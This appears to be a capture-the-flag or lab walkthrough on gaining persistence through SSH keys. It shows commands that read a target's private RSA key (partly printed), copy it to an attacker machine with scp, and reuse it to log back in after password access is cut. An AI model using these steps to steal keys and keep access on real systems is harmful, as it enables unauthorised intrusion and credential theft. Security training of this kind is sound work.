# Persistence Via SSH Keys

Access to the target with SSH
```bash
student@demo:~$ ls -al
total 24
drwxr-xr-x 1 student student 4096 Jul 30 01:04 .
drwxr-xr-x 1 root    root    4096 Apr 26  2019 ..
drwx------ 2 student student 4096 Jul 30 01:04 .cache
drwxr-xr-x 1 root    root    4096 Apr 26  2019 .ssh
-rw-r--r-- 1 student student   91 Apr 26  2019 wait

student@demo:~$ cat wait
Delete this file to trigger connection reset.

Delete it only after planting the backdoor.

student@demo:~$ cd .ssh
student@demo:~/.ssh$ 
student@demo:~/.ssh$ ls
authorized_keys  id_rsa    <- private key
student@demo:~/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3JH1zC1WJuJ2KCPf1UdJe1dX+Uh4aE9RKsnuQk124eOB601/
8+Q6uJej38goVYQ7Dc4INK9Pq9cOs+uDQfRdjS1/9S7a0bDVORR6Q/E3dya0RDsz
LcaqX6LkPgnBZ2gS37E4mX6kiwEvYeqaAGyFqyfn+QPLos/Znc3EA4A71LPFg01b
AmpI6Gbaa7UUG+MCZoM0qDNo5Mzr5bmtCnVOKQ6n0Qx7znu5A2p00TfzmAo7erZ8
6xJUfXQoVFzqmINqhZKFZtjgV5nk/qHgn1BPyd6NoWeXADdIJKi7iq4jomT+Ny+/
HlxrAs1IJhxtrSExSMTkqmH/3KeX9ibBWXzY1QIDAQABAoIBAEO0liOvgvN6rlRR
~~~~
```

Transfer private key file to attaker machine
```bash
└─# scp student@192.178.247.3:~/.ssh/id_rsa .
student@192.178.247.3's password: 
id_rsa                                  100% 1679     1.8MB/s   00:00 

└─# ls 
Desktop    Downloads  Music     Public     thinclient_drives
Documents  id_rsa     Pictures  Templates  Videos

# Give permission
└─# chmod 400 id_rsa
```

Access to the target via SSH again and remove wait file
```bash
└─# ssh student@192.178.247.3
student@192.178.247.3's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 6.8.0-39-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Wed Jul 30 01:04:21 2025 from 192.178.247.2
student@demo:~$ ls
wait
student@demo:~$ rm wait
student@demo:~$ Connection to 192.178.247.3 closed by remote host.
Connection to 192.178.247.3 closed.
```

student:password is not working anymore
```bash
└─# ssh student@192.178.247.3                                             
student@192.178.247.3's password: 
Permission denied, please try again.
student@192.178.247.3's password: 
```

Access with private key
```bash
└─# ssh -i id_rsa student@192.178.247.3
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 6.8.0-39-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Wed Jul 30 01:15:59 2025 from 192.178.247.2
student@demo:~$ 
```

Find the flag
```bash
student@demo:~$ ls
flag.txt
cat: flag: No such file or directory
student@demo:~$ cat flag.txt
689227a4f1b97afe1ff5ebaf85babc19 
```